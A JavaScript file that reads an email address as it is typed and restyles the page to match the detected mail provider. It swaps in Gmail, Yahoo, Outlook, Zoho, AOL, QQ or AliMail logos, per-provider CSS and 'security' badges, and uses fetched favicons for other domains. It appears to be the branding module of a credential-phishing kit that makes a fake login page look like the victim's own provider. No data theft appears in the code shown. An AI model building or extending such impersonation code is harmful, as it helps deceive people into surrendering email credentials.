document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("emailInput").addEventListener("input", detectProvider);
});

function detectProvider() {
    let email = document.getElementById("emailInput").value;
    let brandingBox = document.getElementById("brandingBox");
    let providerName = document.getElementById("providerName");
    let logo = document.getElementById("logo");
    let secureIcon = document.getElementById("secureIcon");
    let dynamicCSS = document.getElementById("dynamicCSS");

    if (!email.includes("@")) {
        brandingBox.style.display = "none";
        secureIcon.src = "assets/secure-icon.png"; 
        dynamicCSS.href = "css/default.css"; 
        return;
    }

    let domain = email.split("@")[1].toLowerCase();
    let providers = {
        "gmail.com": { name: "Gmail", logo: "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico", security: "https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg", style: "css/gmail.css" },
        "yahoo.com": { name: "Yahoo Mail", logo: "https://s.yimg.com/rz/p/yahoo_mail_en-US_f_p_bestfit_mail_2x.png", security: "https://s.yimg.com/rz/p/yahoo_security_en-US.svg", style: "css/yahoo.css" },
        "outlook.com": { name: "Outlook", logo: "https://outlook-1.cdn.office.net/owamail/20210312004.07/resources/images/owa_brand.ico", security: "https://outlook-1.cdn.office.net/owamail/20210312004.07/resources/images/microsoft_secure.svg", style: "css/outlook.css" },
        "zoho.com": { name: "Zoho Mail", logo: "https://www.zoho.com/favicon.ico", security: "https://www.zoho.com/mail/images/zoho-secure.png", style: "css/zoho.css" },
        "aol.com": { name: "AOL Mail", logo: "https://www.aol.com/favicon.ico", security: "https://www.aol.com/security/aol-security-logo.png", style: "css/aol.css" },
        "qq.com": { name: "QQ Mail", logo: "https://qzonestyle.gtimg.cn/qzone_v6/img/qqmail_favicon.ico", security: "https://qzonestyle.gtimg.cn/qzone_v6/img/qqmail_security.png", style: "css/qq.css" },
        "alimail.com": { name: "AliMail", logo: "https://www.alibabagroup.com/favicon.ico", security: "https://www.alibabagroup.com/security/alibaba-secure.png", style: "css/alimail.css" }
    };

    if (providers[domain]) {
        brandingBox.style.display = "block";
        providerName.innerText = providers[domain].name;
        logo.src = providers[domain].logo;
        secureIcon.src = providers[domain].security || "assets/secure-icon.png";
        dynamicCSS.href = providers[domain].style;
    } else {
        brandingBox.style.display = "block";
        providerName.innerText = domain.toUpperCase();
        logo.src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
        secureIcon.src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
        dynamicCSS.href = "css/default.css";
    }
}
